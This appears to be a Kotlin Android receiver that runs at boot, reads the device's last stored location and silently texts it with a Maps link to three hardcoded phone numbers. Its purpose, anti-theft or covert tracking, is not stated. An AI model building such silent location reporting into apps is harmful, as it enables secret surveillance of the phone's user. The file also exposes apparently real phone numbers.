package com.example.androidessncial.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import com.example.androidessncial.database.DatabaseHelper

@Suppress("DEPRECATION")
class BootReceiver : BroadcastReceiver()
{
    override fun onReceive(context: Context?, intent: Intent?)
    {
        if (intent?.action == "android.intent.action.BOOT_COMPLETED") {
            senderSmsBoot(context)
        }
    }

    private fun senderSmsBoot(context: Context?)
    {
        val getDateLocation = context?.let { DatabaseHelper(it) }
        val getData = getDateLocation?.getAllItems()
        val get = getData?.last()

        val date = get?.datedmy
        val time = get?.datetime
        val latitude = get?.latitude
        val longitude = get?.longitude

        val googleMapsUrl =
            "http://maps.google.com/maps?q=$latitude,$longitude"
        val locationInfo =
            "Data:$date\nHora:$time"

        val testAddress = "935189465"
        val smsManager = SmsManager.getDefault()

        val testAddress1 = "950466103"
        val smsManager1 = SmsManager.getDefault()

        val testAddress2 = "946112779"
        val smsManager2 = SmsManager.getDefault()

        smsManager.sendTextMessage(
            testAddress,
            null,
            "$locationInfo\n$googleMapsUrl",
            null,
            null
        )

        smsManager1.sendTextMessage(
            testAddress1,
            null,
            "$locationInfo\n$googleMapsUrl",
            null,
            null
        )

        smsManager2.sendTextMessage(
            testAddress2,
            null,
            "$locationInfo\n$googleMapsUrl",
            null,
            null
        )
    }
}